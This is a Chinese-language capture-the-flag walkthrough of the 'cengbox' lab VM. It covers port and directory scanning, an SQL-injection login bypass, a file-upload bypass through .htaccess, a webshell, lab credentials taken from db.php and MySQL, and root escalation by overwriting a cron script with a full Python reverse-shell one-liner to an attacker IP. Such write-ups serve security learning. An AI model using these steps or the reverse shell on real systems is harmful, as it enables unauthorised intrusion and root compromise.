### 信息收集：

```
nmap -sP 192.168.0.0/24 
```

```
nmap -p- -sV -A 192.168.0.102 
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:cc:28:f3:8c:f5:0e:3f:5a:ed:13:f3:ad:53:13:9b (RSA)
|   256 f7:3a:a3:ff:a1:f7:e5:1b:1e:6f:58:5f:c7:02:55:9b (ECDSA)
|_  256 f0:dd:2e:1d:3d:0a:e8:c1:5f:52:7c:55:2c:dc:1e:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: CEng Company
MAC Address: 00:0C:29:2F:CF:B5 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 192.168.0.102 (192.168.0.102)
```

```
└─# searchsploit OpenSSH 7.2  
```

发现此版本Apache存在解析漏洞：CVE-2017-15715，和文件上传有关

goby扫了一下，显示无漏洞

这里之前使用时的字典小了，啥也没有，22端口也只能爆破，就换了个大字典，发现/masteradmin

```
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
└─# nikto -host 192.168.0.102
```

```
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htaccess.json       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.git.bak    (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.txt.bak    (Status: 403) [Size: 278]
/.htaccess.php.bak    (Status: 403) [Size: 278]
/.htpasswd.json       (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.git        (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/.htaccess.html.bak   (Status: 403) [Size: 278]
/.htpasswd.git.bak    (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.php.bak    (Status: 403) [Size: 278]
/.htpasswd.html.bak   (Status: 403) [Size: 278]
/.htpasswd.txt.bak    (Status: 403) [Size: 278]
/.htpasswd.git        (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.102/css/]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.102/img/]
/index.php            (Status: 200) [Size: 5812]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.102/js/]
/masteradmin          (Status: 301) [Size: 320] [--> http://192.168.0.102/masteradmin/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.0.102/uploads/]
/vendor               (Status: 301) [Size: 315] [--> http://192.168.0.102/vendor/]

+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.

```

再试试对http://192.168.0.102/masteradmin/下目录文件枚举

```
└─# gobuster dir -u http://192.168.0.102/masteradmin/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak
/db.php               (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 326] [--> http://192.168.0.102/masteradmin/fonts/]
/images               (Status: 301) [Size: 327] [--> http://192.168.0.102/masteradmin/images/]
/js                   (Status: 301) [Size: 323] [--> http://192.168.0.102/masteradmin/js/]
/login.php            (Status: 200) [Size: 5137]
/upload.php           (Status: 200) [Size: 1440]
/vendor               (Status: 301) [Size: 327] [--> http://192.168.0.102/masteradmin/vendor/]
```

### sql注入后加文件上传：

使用万能密码登录，进入后是一个文件上传界面

<img src=".\图片\Snipaste_2022-11-24_16-04-14.png" alt="Snipaste_2022-11-24_16-04-14" style="zoom:60%;" />

试试apache的解析漏洞

[Apache最新解析漏洞：CVE-2017-15715复现 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/news/338482)

但是我失败了

靶机里可能有.htaccess，而且页面返回提示是：extension not allowed, please choose a CENG file

把文件后缀名改为1.php.ceng，由于.htaccess的解析，即可成功执行1.php.ceng

哥斯拉连上，此时是www权限

### 权限提升：

寻找suid文件

```
find / ‐perm ‐u=s ‐type f 2>/dev/null
```

查看计划任务

```
cat /etc/crontab
```

查看目前进程

```
ps -ef
```

没思路，这里直接上脚本，开python服务下在并运行

发现一个root的定时任务 /opt/md5check.py，但是我们www用户无法查看修改，但只要修改成一个反弹shell就是root权限

这里暂停一下，先搞个交互shell，还是用哥斯拉弹到msf再用python

然后查看到

```
/opt >cat /var/www/html/masteradmin/db.php
$serverName = "localhost";
$username = "root";
$password = "SuperS3cR3TPassw0rd1!";
```

再直接mysql登录，这里有个疑问，我们nmap只扫到80和22端口，但他其实有mysql服务的，应该是mysql对内开放吧

```
mysql> select * from admin;
select * from admin;
+----+-------------+---------------+
| id | username    | password      |
+----+-------------+---------------+
|  1 | masteradmin | C3ng0v3R00T1! |
+----+-------------+---------------+
1 row in set (0.00 sec)
```

su到cengover用户

```
www-data@cengbox:/var/www/html/uploads$ su cengover
su cengover
Password: C3ng0v3R00T1!

cengover@cengbox:/var/www/html/uploads$ id
id
uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),4(adm),24(cdrom),30(dip),46(plugdev),100(users),110(lxd),117(lpadmin),118(sambashare)
```

修改/opt/md5check.py提权

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.103",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >md5check.py
```

等等

<img src=".\图片\Snipaste_2022-11-24_17-43-49.png" alt="Snipaste_2022-11-24_17-43-49" style="zoom:80%;" />

### 总结：

字典不够大？那就换个大点的，再大点。

sql注入的万能密码，文件上传的.htaccess，可把指定后缀文件解析成php。

mysql服务可以开启，在外面不一定扫得到

提权命令不行就上脚本，这里是计划任务，以root身份运行了一个计划任务md5check.py，我们需要修改其为反弹shell，就反弹得到root权限，而我们需要cengover身份才能修改md5check.py，在翻阅网站数据库账号敏感信息，提权到mysql，再到数据表里找到了cengover的密码。